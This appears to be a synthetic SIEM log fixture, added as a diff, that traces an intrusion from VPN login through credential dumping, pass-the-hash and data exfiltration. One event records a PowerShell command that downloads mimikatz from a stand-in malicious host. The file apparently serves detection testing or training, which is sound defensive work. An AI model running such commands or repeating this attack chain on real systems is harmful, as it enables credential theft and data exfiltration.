@@ -1,0 +1,100 @@
+[
+  {
+    "_time": "2026-07-16T09:31:00Z",
+    "sourcetype": "fgt_traffic",
+    "src_ip": "104.22.19.120",
+    "dest_ip": "10.0.1.5",
+    "user": "UNKNOWN",
+    "action": "allowed",
+    "app": "SSL",
+    "msg": "External connection allowed to VPN Gateway"
+  },
+  {
+    "_time": "2026-07-16T09:32:45Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": "4624",
+    "Logon_Type": "3",
+    "user": "jsmith",
+    "src_ip": "104.22.19.120",
+    "dest_host": "VPN-GW-01",
+    "msg": "Successful VPN Authentication (MFA bypassed)"
+  },
+  {
+    "_time": "2026-07-16T09:35:10Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": "4624",
+    "Logon_Type": "3",
+    "user": "jsmith",
+    "src_ip": "10.0.1.5",
+    "dest_host": "DC-01.corp.local",
+    "msg": "Logon via SMB"
+  },
+  {
+    "_time": "2026-07-16T09:36:22Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": "1",
+    "user": "jsmith",
+    "dest_host": "DC-01.corp.local",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c nltest /dclist:corp.local",
+    "msg": "Process created"
+  },
+  {
+    "_time": "2026-07-16T09:38:15Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": "1",
+    "user": "jsmith",
+    "dest_host": "DC-01.corp.local",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://malicious.tk/mimikatz.exe -OutFile C:\\Temp\\mimi.exe",
+    "msg": "Process created (File Download)"
+  },
+  {
+    "_time": "2026-07-16T09:39:05Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": "4673",
+    "user": "jsmith",
+    "dest_host": "DC-01.corp.local",
+    "ProcessName": "C:\\Temp\\mimi.exe",
+    "msg": "Sensitive Privilege Use (SeDebugPrivilege)"
+  },
+  {
+    "_time": "2026-07-16T09:41:30Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": "10",
+    "user": "jsmith",
+    "dest_host": "DC-01.corp.local",
+    "SourceImage": "C:\\Temp\\mimi.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "msg": "Process accessed (Memory Dump)"
+  },
+  {
+    "_time": "2026-07-16T09:45:12Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": "4624",
+    "Logon_Type": "3",
+    "user": "admin_svc",
+    "src_ip": "DC-01.corp.local",
+    "dest_host": "DB-PROD-01",
+    "msg": "Logon via SMB (Pass-the-Hash)"
+  },
+  {
+    "_time": "2026-07-16T09:46:00Z",
+    "sourcetype": "stream:tds",
+    "src_ip": "DC-01.corp.local",
+    "dest_ip": "DB-PROD-01",
+    "user": "admin_svc",
+    "query": "SELECT * FROM users; SELECT * FROM financial_records;",
+    "msg": "Large Database Query Executed"
+  },
+  {
+    "_time": "2026-07-16T09:48:45Z",
+    "sourcetype": "fgt_traffic",
+    "src_ip": "DB-PROD-01",
+    "dest_ip": "104.22.19.120",
+    "user": "SYSTEM",
+    "app": "SSH",
+    "bytes_out": "45089211",
+    "msg": "Large outbound data transfer (Exfiltration)"
+  }
+]
